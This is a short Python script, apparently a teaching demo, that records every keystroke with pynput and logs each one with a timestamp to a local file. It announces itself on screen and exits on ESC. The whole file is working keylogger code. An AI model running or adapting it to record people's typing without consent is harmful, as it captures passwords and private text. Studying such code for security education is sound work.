from pynput import keyboard
import os
import time

log_file = "log.txt"

def on_press(key):
    try:
        log_event(f"Key pressed: {key.char}")
    except AttributeError:
        if key == keyboard.Key.space:
            log_event("Special key pressed: SPACE")
        elif key == keyboard.Key.enter:
            log_event("Special key pressed: ENTER")
        else:
            log_event(f"Special key pressed: {key}")

def on_release(key):
    if key == keyboard.Key.esc:
        log_event("ESC pressed, exiting...")
        return False

def log_event(event):
    timestamp = time.strftime("%Y-%m-%d %H:%M:%S", time.localtime())
    with open(log_file, "a") as f:
        f.write(f"\n{timestamp} - {event} \n")

def main():
    if not os.path.exists(log_file):
        with open(log_file, "w") as f:    
            f.write("Cybersecurity Keylogger Log\n")
            f.write("===========================\n")
            f.write(f"Logging started at: {time.strftime('%Y-%m-%d %H:%M:%S', time.localtime())}\n\n")

    print("*********************************************************************************")
    print("  Keylogger is now running. All keystrokes will be logged.")
    print("  To stop the keylogger, press the ESC key.")
    print("*********************************************************************************")

    with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
        listener.join()

    with open(log_file, "a") as f:
        f.write(f"\nLogging stopped at: {time.strftime('%Y-%m-%d %H:%M:%S', time.localtime())}\n")

if __name__ == "__main__":
    main()
